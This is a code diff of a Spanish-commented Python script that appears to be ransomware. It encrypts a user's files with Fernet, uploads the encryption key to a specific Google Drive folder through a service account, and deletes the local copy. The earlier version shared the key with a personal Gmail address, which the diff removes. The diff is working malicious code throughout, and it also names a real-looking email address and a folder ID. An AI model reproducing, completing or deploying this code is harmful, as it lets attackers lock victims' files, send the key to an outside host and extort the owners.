@@ -1,29 +1,23 @@
+# vesrion 2
+
 import os
 import json
 import hashlib
 from cryptography.fernet import Fernet
-from google.oauth2.service_account import Credentials
 from googleapiclient.discovery import build
 from googleapiclient.http import MediaFileUpload
+from google.oauth2 import service_account
 
 # --- Configuración ---
 EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
 ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']
 SCOPES = ['https://www.googleapis.com/auth/drive']
 EMAIL_DESTINO = 'guzman.sadym@gmail.com'
+PARENT_FOLDER_ID = "1CJi8m_p2fjjA1HcyR8ThUZq7aJ_uCg8b"
 
 # --- Credenciales de cuenta de servicio incrustadas directamente ---
-SERVICE_ACCOUNT_INFO = {
-    "type": "service_account",
-    "project_id": "TU_PROJECT_ID",
-    "private_key_id": "TU_PRIVATE_KEY_ID",
-    "private_key": "-----BEGIN PRIVATE KEY-----\nTU_CLAVE_PRIVADA\n-----END PRIVATE KEY-----\n",
-    "client_email": "TU_EMAIL_CUENTA_SERVICIO",
-    "client_id": "TU_CLIENT_ID",
-    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-    "token_uri": "https://oauth2.googleapis.com/token",
-    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/TU_EMAIL_CUENTA_SERVICIO"
+SERVICE_ACCOUNT_FILE = {
+# creds de api google
 }
 
 # --- Funciones ---
@@ -74,22 +68,18 @@ def encriptar_archivos(archivos, key):
             print(f"✘ Error con {archivo}: {e}")
     return hashes
 
-def subir_archivo(nombre_local, nombre_remoto):
-    creds = Credentials.from_service_account_info(SERVICE_ACCOUNT_INFO, scopes=SCOPES)
-    servicio = build('drive', 'v3', credentials=creds)
-    archivo_metadata = {'name': nombre_remoto}
-    media = MediaFileUpload(nombre_local, resumable=True)
-    archivo = servicio.files().create(body=archivo_metadata, media_body=media, fields='id').execute()
-    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")
+def subir_archivo(nombre_local):
+    creds = service_account.Credentials.from_service_account_info(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
+    service = build('drive', 'v3', credentials=creds)
 
-    # Compartir con correo personal
-    permiso = {
-        'type': 'user',
-        'role': 'reader',
-        'emailAddress': EMAIL_DESTINO
+    file_metadata = {
+        'name': 'key.key',
+        'parents': [PARENT_FOLDER_ID]
     }
-    servicio.permissions().create(fileId=archivo.get('id'), body=permiso, fields='id').execute()
-    print(f"[📩] Compartido con {EMAIL_DESTINO}")
+
+    media = MediaFileUpload(nombre_local, resumable=True)
+    archivo = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")
 
 # --- Ejecución principal ---
 if __name__ == "__main__":
@@ -109,7 +99,7 @@ if __name__ == "__main__":
     with open("hashes.json", "w") as f:
         json.dump(hashes, f)
 
-    subir_archivo("key.key", "key.key")
+    subir_archivo("key.key")
     os.remove("key.key")
 
     escritorio = os.path.join(ruta_home, "Desktop")
